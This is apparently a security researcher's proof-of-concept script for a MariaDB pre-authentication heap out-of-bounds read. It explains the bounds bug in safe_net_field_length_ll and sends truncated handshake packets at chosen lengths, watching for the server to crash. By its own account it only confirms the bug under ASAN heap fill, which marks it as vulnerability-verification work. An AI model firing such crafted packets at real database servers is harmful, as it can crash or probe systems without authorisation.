#!/usr/bin/env python3
"""
The bound handed to safe_net_field_length_ll() can go negative.

    char *passwd= strend(user)+1;                         /* sql_acl.cc:14547 */
    ...
    ulonglong len= safe_net_field_length_ll((uchar**)&passwd,
                      net->read_pos + pkt_len - (uchar*)passwd);  /* :14581 */

and the helper takes that bound as *unsigned*:

    my_ulonglong safe_net_field_length_ll(uchar **packet, size_t packet_len);

When the username runs to the final byte of the packet with no NUL of its own,
strend(user) lands on the terminator my_net_read() guarantees at
read_pos[pkt_len], so passwd == read_pos + pkt_len + 1 and the difference is
-1, which converts to SIZE_MAX. Every `if (packet_len < N) goto err` inside the
helper then passes, so the 0xFE case runs

    (*packet)+=9;  return (my_ulonglong) uint8korr(pos+1);

reading pos[1..8] with no bound at all.

net_allocate_new_packet() allocates max_packet + NET_HEADER_SIZE +
COMP_HEADER_SIZE + 1, i.e. max_packet + 8, and buff_end is buff + max_packet,
so there are exactly 8 bytes of slack past buff_end. With pkt_len == max_packet
the read runs to index max_packet + 9 while the last valid index is
max_packet + 7 -- two bytes past the end of the heap block.

Reaching it needs the byte at passwd (inside that 8-byte slack, which no packet
ever writes) to be 0xFE. That byte is not attacker-supplied, so this script
makes the heap adversarial instead of the packet: run the server under
ASAN_OPTIONS=malloc_fill_byte=254:max_malloc_fill_size=<big> and the slack is
0xFE. If the analysis is right, ASAN reports a heap-buffer-overflow READ -- a
real out-of-bounds read, not a use-after-poison from our own instrumentation.

Usage: python3 -I poc_lenenc_bound.py [host] [port] [reps]
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mariadb_preauth import (  # noqa: E402
    Conn, server_alive, BASE_CAPS, CLIENT_PROTOCOL_41, CLIENT_SECURE_CONNECTION,
    CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA, CLIENT_CONNECT_WITH_DB,
    CLIENT_PLUGIN_AUTH, CLIENT_CONNECT_ATTRS, CLIENT_MYSQL,
)

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3307
REPS = int(sys.argv[3]) if len(sys.argv) > 3 else 40


def case(total_len):
    """A packet of exactly `total_len` bytes whose username runs to the last
    byte, selecting the length-encoded auth-data branch."""
    c = Conn(HOST, PORT, timeout=25.0)
    if c.read_greeting() is None:
        return "no greeting", True
    caps = (CLIENT_PROTOCOL_41 | BASE_CAPS | CLIENT_SECURE_CONNECTION |
            CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA) & ~(
            CLIENT_CONNECT_WITH_DB | CLIENT_PLUGIN_AUTH |
            CLIENT_CONNECT_ATTRS | CLIENT_MYSQL)
    user_len = total_len - 32
    if user_len < 1:
        return "too short", True
    pkt = c.build_handshake_response(
        caps=caps, ext_caps=0, charset=45,
        user=b"u" * user_len,
        truncate=total_len,            # cut before the username's own NUL
    )
    assert len(pkt) == total_len, (len(pkt), total_len)
    try:
        c.send_packet(pkt)
        reply = c.read_packet()
    except OSError as e:
        c.close()
        return f"closed: {type(e).__name__}", server_alive(HOST, PORT, 10.0)
    c.close()
    if reply and reply[0] == 0xff:
        return f"err{reply[1] | (reply[2] << 8)}", True
    return f"reply {reply[:1].hex() if reply else 'none'}", True


def main():
    if not server_alive(HOST, PORT, 20.0):
        print("server not reachable")
        return 2
    # max_packet is rounded up to IO_SIZE (4096) by net_realloc, so a packet of
    # exactly a multiple of 4096 leaves max_packet == pkt_len and the slack at
    # its minimum of 8 bytes. Neighbours are included because the read reaches
    # pkt_len + 9 and the last valid index is max_packet + 7.
    lengths = [16384, 16383, 16382, 12288, 12287, 8192, 8191, 4096, 4095,
               20480, 20479]
    print(f"target {HOST}:{PORT}  reps={REPS} per length\n")
    for total in lengths:
        outs = {}
        for _ in range(REPS):
            out, alive = case(total)
            outs[out] = outs.get(out, 0) + 1
            if not alive:
                print(f"  len={total:<6} *** SERVER DIED *** ({out})")
                return 1
        summary = "  ".join(f"{k}x{v}" for k, v in sorted(outs.items()))
        print(f"  len={total:<6} {summary}")
    print(f"\nserver alive at end: {server_alive(HOST, PORT, 20.0)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
